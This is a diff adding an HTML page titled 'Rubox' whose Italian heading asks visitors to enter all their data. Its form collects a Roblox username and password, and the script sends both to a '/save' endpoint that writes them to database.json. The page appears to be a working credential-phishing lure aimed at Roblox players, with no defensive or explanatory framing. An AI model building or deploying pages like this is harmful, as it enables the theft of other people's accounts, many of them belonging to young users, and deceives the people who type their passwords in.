@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rubox</title>
+</head>
+<body>
+    <h2>metti tutti i dati</h2>
+    <form id="managerForm">
+        <input type="text" id="robloxUser" placeholder="Roblox Username" required><br><br>
+        <input type="password" id="robloxPass" placeholder="Roblox Password" required><br><br>
+        <button type="submit">Ok</button>
+    </form>
+
+    <script>
+        document.getElementById('managerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const userData = {
+                username: document.getElementById('robloxUser').value,
+                password: document.getElementById('robloxPass').value,
+                date: new Date().toLocaleString()
+            };
+
+            // This sends the data to your server.js
+            const response = await fetch('/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(userData)
+            });
+
+            if (response.ok) {
+                alert('Data saved successfully to database.json');
+                document.getElementById('managerForm').reset();
+            } else {
+                alert('Error saving data.');
+            }
+        });
+    </script>
+</body>
+</html>
